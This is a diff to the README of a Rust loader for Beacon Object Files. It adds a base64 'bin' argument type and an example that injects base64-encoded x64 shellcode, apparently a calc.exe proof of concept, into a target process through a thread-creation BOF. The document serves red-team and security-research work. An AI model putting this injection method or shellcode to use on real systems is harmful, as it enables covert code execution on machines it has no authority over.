@@ -13,7 +13,7 @@ Coffee: A COFF loader made in Rust
 Usage: coffee.exe [OPTIONS] --bof-path <BOF_PATH> [-- <ARGS>...]
 
 Arguments:
-  [ARGS]...  Arguments to the BOF passed after the "--" delimiter, supported types are: str, wstr, int, short
+  [ARGS]...  Arguments to the BOF passed after the "--" delimiter, supported types are: str, wstr, int, short, bin
 
 Options:
   -b, --bof-path <BOF_PATH>      Path to the Beacon Object File (BOF)
@@ -31,13 +31,20 @@ Arguments for the BOF can be passed after the `--` delimiter. Each argument must
 - `wstr` - A wide null-terminated string
 - `int` - A signed 32-bit integer
 - `short` - A signed 16-bit integer
+- `bin` - A base64-encoded binary blob
 
-## Example
+## Examples
 
 Using the `dir.x64.o` BOF from the [trustedsec/CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) repository and passing arguments to the BOF:
 
 ```bash
 coffee.exe --bof-path .\dir.x64.o -- wstr:"C:\\Windows\\System32"
+```
+
+Using the `ntcreatethread.x64.o` BOF from the [trustedsec/CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) repository and passing a PID and the shellcode to execute as base64-encoded binary data.
+
+```bash
+coffee.exe --bof-path .\ntcreatethread.x64.o -- int:1337 bin:/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA
 ```
 
 ## Usage as library
